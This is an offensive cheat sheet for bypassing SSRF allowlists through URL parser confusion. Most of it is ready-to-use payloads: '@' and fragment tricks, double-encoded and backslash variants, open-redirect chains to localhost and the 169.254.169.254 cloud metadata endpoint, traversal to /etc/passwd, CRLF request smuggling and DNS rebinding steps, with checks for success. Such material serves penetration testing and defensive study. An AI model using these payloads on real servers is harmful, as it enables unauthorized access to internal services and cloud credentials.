# SSRF — URL Parser Confusion / Allowlist Bypass

## When this applies

- Server validates the URL with one parser (often Python `urlparse`) but fetches it with another (often `curl` / `requests`).
- Allowlist checks hostname against `trusted.com` and trusts substring/prefix matches.
- Goal: craft a URL where the validator sees the trusted host but the fetcher sees an internal/attacker host.

## Technique

Use `@`, `#`, fragment-double-encoding, backslash, multiple slashes, or open redirects on trusted domains. Different parsers disagree on which part is host vs path/query/userinfo.

## Steps

### Subdomain confusion

```bash
# Attacker-controlled subdomain
http://trusted.com.attacker.com/

# Subdomain takeover
http://abandoned-subdomain.trusted.com/
```

### Open redirect chaining

```bash
# Via trusted domain
http://trusted.com/redirect?url=http://localhost/admin
http://trusted.com/goto?next=http://169.254.169.254/
```

### URL parser confusion

```bash
# @ symbol exploitation
http://trusted.com@attacker.com/
http://attacker.com@trusted.com/
http://localhost@trusted.com/

# Fragment/anchor abuse
http://localhost#@trusted.com
http://localhost:80#@trusted.com/admin

# Double-encoded fragment
http://localhost:80%2523@trusted.com/admin

# Username/password in URL
http://user:pass@trusted.com:80@localhost/
```

### Path traversal in URL

```bash
# Directory traversal
http://trusted.com/../../../localhost/admin
http://trusted.com/../../etc/passwd

# Encoded traversal
http://trusted.com/%2e%2e%2f%2e%2e%2f/etc/passwd
http://trusted.com/..%2f..%2f..%2f/etc/passwd
```

### CRLF injection in URL

```bash
# Inject headers
http://trusted.com/%0d%0aHost:%20localhost

# Full request smuggling
http://trusted.com/%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

### Protocol confusion

```bash
# Different schemes
https://trusted.com vs http://trusted.com
HTTP://trusted.com vs http://trusted.com

# Backslash (Windows-style)
http://trusted.com\@localhost/
http:\\localhost/admin

# Forward slash alternatives
http:/\/\/localhost/admin
http://////localhost/admin
```

### DNS rebinding

```bash
# Time-of-check vs time-of-use
1. Request: http://attacker.com (resolves to 1.2.3.4 - passes check)
2. TTL expires, DNS updates
3. Server connects: http://attacker.com (now resolves to 127.0.0.1)

# Public services
http://rebinder.net
http://rbndr.us
http://dnsrebind.it

# Custom setup
attacker.com → 1.2.3.4 (TTL: 1 second)
attacker.com → 127.0.0.1 (after TTL expires)
```

## Verifying success

- Validator accepts the URL (no allowlist error) but fetcher hits a different host.
- Internal endpoint content returned in response.
- DNS rebinding race wins — second request lands on rebinded IP.

## Common pitfalls

- Modern parsers (RFC-compliant) reject `@` after a path — but legacy/custom parsers may accept.
- Open redirects on trusted domains are the most reliable path — combine with internal-IP target.
- DNS rebinding TTL must align with the server's DNS cache TTL — test multiple TTL values.

## Tools

- Burp Suite Repeater
- DNS rebinding services
- Open redirect databases / fuzzers (gauplus, urlfinder)
- nslookup / dig (verify DNS resolution behavior)
